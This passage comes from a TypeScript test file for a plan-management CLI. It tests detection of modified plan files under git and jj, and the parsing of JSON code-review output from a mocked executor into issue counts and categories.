      getUsingJj: async () => false,
    }));

    const result = await getModifiedPlanFilesOnBranch('/test/repo', '/test/repo/tasks');

    expect(result).toHaveLength(2);
    expect(result).toContain('/test/repo/tasks/modified-plan.yml');
    expect(result).toContain('/test/repo/tasks/another.plan.md');
    expect(result).not.toContain('/test/repo/tasks/new.yml'); // Added file, not modified
  });

  test('getModifiedPlanFilesOnBranch detects modified files in jj', async () => {
    const { getModifiedPlanFilesOnBranch } = await import('../plans.js');

    await moduleMocker.mock('bun', () => ({
      $: mock().mockImplementation((template: TemplateStringsArray) => {
        const command = template.join('');
        if (command.includes('jj diff --from')) {
          return {
            cwd: mock(() => ({
              nothrow: () => ({
                text: () =>
                  'FF tasks/modified-plan.yml\nFF tasks/another.plan.md\n-F tasks/new.yml',
              }),
            })),
            nothrow: mock(() => ({
              text: () => 'FF tasks/modified-plan.yml\nFF tasks/another.plan.md\n-F tasks/new.yml',
            })),
            text: mock(
              () => 'FF tasks/modified-plan.yml\nFF tasks/another.plan.md\n-F tasks/new.yml'
            ),
          };
        }
        return {
          cwd: mock(() => ({ nothrow: () => ({ text: () => '' }) })),
          nothrow: mock(() => ({ text: () => '' })),
          text: mock(() => ''),
        };
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
      getUsingJj: async () => true,
    }));

    const result = await getModifiedPlanFilesOnBranch('/test/repo', '/test/repo/tasks');

    expect(result).toHaveLength(2);
    expect(result).toContain('/test/repo/tasks/modified-plan.yml');
    expect(result).toContain('/test/repo/tasks/another.plan.md');
    expect(result).not.toContain('/test/repo/tasks/new.yml'); // Added file, not modified
  });
});

describe('JSON output mode integration', () => {
  test('detects JSON output from executor metadata and parses correctly', async () => {
    const planContent = `
id: 200
title: JSON Output Test Plan
goal: Test JSON output parsing
tasks:
  - title: Test task
    description: A test task for JSON output
`;
    const planFile = join(testDir, 'json-output-test.yml');
    await writeFile(planFile, planContent);

    // JSON output that the executor would return with structured format
    const jsonReviewOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in user input',
          file: 'src/db.ts',
          line: '42',
          suggestion: 'Use parameterized queries',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'N+1 query in user listing',
          file: 'src/api.ts',
          line: '15',
          suggestion: 'Batch database queries',
        },
      ],
      recommendations: ['Add input validation'],
      actionItems: ['Fix SQL injection before release'],
    });

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        // Return an ExecutorOutput object with metadata.jsonOutput = true
        return {
          content: jsonReviewOutput,
          success: true,
          metadata: {
            jsonOutput: true,
          },
        };
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 200,
        title: 'JSON Output Test Plan',
        goal: 'Test JSON output parsing',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task for JSON output',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
      getCurrentCommitHash: async () => 'abc123',
    }));

    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => ({
        resolvedPlanFile: planFile,
        planData: {
          id: 200,
          title: 'JSON Output Test Plan',
          goal: 'Test JSON output parsing',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task for JSON output',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/db.ts', 'src/api.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }),
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command
    await handleReviewCommand(planFile, { noAutofix: true }, mockCommand);

    // Verify the executor was called
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      expect.any(String),
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('executor string output must be valid JSON', async () => {
    const planContent = `
id: 201
title: JSON Output Test Plan
goal: Test JSON output parsing
tasks:
  - title: Test task
    description: A test task for JSON output
`;
    const planFile = join(testDir, 'json-output-test.yml');
    await writeFile(planFile, planContent);

    // JSON output that the executor would return in string format
    const jsonReviewOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in database queries',
          file: 'src/database.ts',
          line: '88',
          suggestion: 'Use parameterized queries',
        },
      ],
      recommendations: ['Use parameterized queries'],
      actionItems: [],
    });

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        // Return a plain JSON string (no ExecutorOutput wrapper)
        return jsonReviewOutput;
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 201,
        title: 'Text Output Test Plan',
        goal: 'Test text output parsing',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task for text output',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
      getCurrentCommitHash: async () => 'def456',
    }));

    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => ({
        resolvedPlanFile: planFile,
        planData: {
          id: 201,
          title: 'Text Output Test Plan',
          goal: 'Test text output parsing',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task for text output',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/queries.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }),
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command - should not throw
    await handleReviewCommand(planFile, { noAutofix: true }, mockCommand);

    // Verify the executor was called
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('executor output with JSON content is parsed correctly', async () => {
    const planContent = `
id: 202
title: JSON Mode Plan
goal: Test JSON mode
tasks:
  - title: Test task
    description: A test task
`;
    const planFile = join(testDir, 'json-mode-test.yml');
    await writeFile(planFile, planContent);

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'major',
          category: 'performance',
          content: 'Performance issue detected',
          file: 'src/perf.ts',
          line: '33',
          suggestion: 'Optimize the algorithm',
        },
      ],
      recommendations: [],
      actionItems: [],
    });

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        // Return an ExecutorOutput object with JSON content
        return {
          content: jsonOutput,
          success: true,
          metadata: {
            jsonOutput: true,
          },
        };
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 202,
        title: 'Explicit Text Mode Plan',
        goal: 'Test explicit text mode',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
      getCurrentCommitHash: async () => 'ghi789',
    }));

    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => ({
        resolvedPlanFile: planFile,
        planData: {
          id: 202,
          title: 'Explicit Text Mode Plan',
          goal: 'Test explicit text mode',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }),
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Execute the review command
    await handleReviewCommand(planFile, { noAutofix: true }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('summary statistics are correctly calculated from JSON-parsed issues', async () => {
    // This test verifies that when issues are parsed from JSON, the summary
    // statistics (criticalCount, majorCount, etc.) are correctly computed
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'Issue 1',
          file: 'src/test.ts',
          line: '1',
          suggestion: 'Fix 1',
        },
        {
          severity: 'critical',
          category: 'security',
          content: 'Issue 2',
          file: 'src/test.ts',
          line: '2',
          suggestion: 'Fix 2',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'Issue 3',
          file: 'src/test.ts',
          line: '3',
          suggestion: 'Fix 3',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Issue 4',
          file: 'src/test.ts',
          line: '4',
          suggestion: 'Fix 4',
        },
        {
          severity: 'info',
          category: 'other',
          content: 'Issue 5',
          file: 'src/test.ts',
          line: '5',
          suggestion: 'Fix 5',
        },
      ],
      recommendations: ['Rec 1', 'Rec 2'],
      actionItems: ['Action 1'],
    });

    const result = createReviewResult(
      'test-plan',
      'Test Plan',
      'main',
      ['file1.ts', 'file2.ts', 'file3.ts'],
      jsonOutput
    );

    // Verify summary statistics
    expect(result.summary.totalIssues).toBe(5);
    expect(result.summary.criticalCount).toBe(2);
    expect(result.summary.majorCount).toBe(1);
    expect(result.summary.minorCount).toBe(1);
    expect(result.summary.infoCount).toBe(1);
    expect(result.summary.filesReviewed).toBe(3);

    // Verify category counts
    expect(result.summary.categoryCounts.security).toBe(2);
    expect(result.summary.categoryCounts.performance).toBe(1);
    expect(result.summary.categoryCounts.style).toBe(1);
    expect(result.summary.categoryCounts.other).toBe(1);

    // Verify issues have auto-generated IDs
    expect(result.issues[0].id).toBe('issue-1');
    expect(result.issues[4].id).toBe('issue-5');

    // Verify recommendations and action items
    expect(result.recommendations).toEqual(['Rec 1', 'Rec 2']);
    expect(result.actionItems).toEqual(['Action 1']);
  });

  test('JSON parsing correctly extracts all issue fields including file, line, and suggestion', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'SQL injection vulnerability in user input',
          file: 'src/db.ts',
          line: '42',
          suggestion: 'Use parameterized queries',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'N+1 query in user listing',
          file: 'src/api.ts',
          line: '15',
          suggestion: 'Use batch queries',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Inconsistent naming convention',
          file: 'src/utils.ts',
          line: '25-30',
          suggestion: 'Use consistent naming',
        },
      ],
      recommendations: ['Add input validation', 'Use prepared statements'],
      actionItems: ['Fix SQL injection before release', 'Add performance tests'],
    });

    const result = createReviewResult(
      'test-plan',
      'Test Plan',
      'main',
      ['src/db.ts', 'src/api.ts'],
      jsonOutput
    );

    // Verify first issue has all fields
    expect(result.issues[0]).toMatchObject({
      id: 'issue-1',
      severity: 'critical',
      category: 'security',
      content: 'SQL injection vulnerability in user input',
      file: 'src/db.ts',
      line: '42',
      suggestion: 'Use parameterized queries',
    });

    // Verify second issue has all fields
    expect(result.issues[1]).toMatchObject({
      id: 'issue-2',
      severity: 'major',
      category: 'performance',
      content: 'N+1 query in user listing',
      file: 'src/api.ts',
      line: '15',
      suggestion: 'Use batch queries',
    });

    // Verify third issue has all fields
    expect(result.issues[2]).toMatchObject({
      id: 'issue-3',
      severity: 'minor',
      category: 'style',
      content: 'Inconsistent naming convention',
      file: 'src/utils.ts',
      line: '25-30',
      suggestion: 'Use consistent naming',
    });

    // Verify recommendations and action items arrays
    expect(result.recommendations).toEqual(['Add input validation', 'Use prepared statements']);
    expect(result.actionItems).toEqual([
      'Fix SQL injection before release',
      'Add performance tests',
    ]);
  });

  test('JSON parsing handles empty arrays correctly', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [],
      recommendations: [],
      actionItems: [],
    });

    const result = createReviewResult('test-plan', 'Test Plan', 'main', ['file.ts'], jsonOutput);

    expect(result.issues).toEqual([]);
    expect(result.recommendations).toEqual([]);
    expect(result.actionItems).toEqual([]);
    expect(result.summary.totalIssues).toBe(0);
    expect(result.summary.criticalCount).toBe(0);
    expect(result.summary.majorCount).toBe(0);
    expect(result.summary.minorCount).toBe(0);
    expect(result.summary.infoCount).toBe(0);
  });

  test('JSON parsing extracts all category types correctly', async () => {
    const { createReviewResult } = await import('../formatters/review_formatter.js');

    const jsonOutput = JSON.stringify({
      issues: [
        {
          severity: 'critical',
          category: 'security',
          content: 'Security issue',
          file: 'src/test.ts',
          line: '1',
          suggestion: 'Fix security',
        },
        {
          severity: 'major',
          category: 'performance',
          content: 'Performance issue',
          file: 'src/test.ts',
          line: '2',
          suggestion: 'Fix performance',
        },
        {
          severity: 'major',
          category: 'bug',
          content: 'Bug issue',
          file: 'src/test.ts',
          line: '3',
          suggestion: 'Fix bug',
        },
        {
          severity: 'minor',
          category: 'style',
          content: 'Style issue',
          file: 'src/test.ts',
          line: '4',
          suggestion: 'Fix style',
        },
        {
          severity: 'minor',
          category: 'compliance',
          content: 'Compliance issue',
          file: 'src/test.ts',
          line: '5',
          suggestion: 'Fix compliance',
        },
        {
          severity: 'info',
          category: 'testing',
          content: 'Testing issue',
          file: 'src/test.ts',
          line: '6',
          suggestion: 'Fix testing',
        },
        {
          severity: 'info',
          category: 'other',
          content: 'Other issue',
          file: 'src/test.ts',
          line: '7',
          suggestion: 'Fix other',
        },
      ],
      recommendations: [],
      actionItems: [],
    });

    const result = createReviewResult('test-plan', 'Test Plan', 'main', [], jsonOutput);

    // Verify all category counts
    expect(result.summary.categoryCounts.security).toBe(1);
    expect(result.summary.categoryCounts.performance).toBe(1);
    expect(result.summary.categoryCounts.bug).toBe(1);
    expect(result.summary.categoryCounts.style).toBe(1);
    expect(result.summary.categoryCounts.compliance).toBe(1);
    expect(result.summary.categoryCounts.testing).toBe(1);
    expect(result.summary.categoryCounts.other).toBe(1);

    // Verify severity counts
    expect(result.summary.criticalCount).toBe(1);
    expect(result.summary.majorCount).toBe(2);
    expect(result.summary.minorCount).toBe(2);
    expect(result.summary.infoCount).toBe(2);
    expect(result.summary.totalIssues).toBe(7);
  });
});
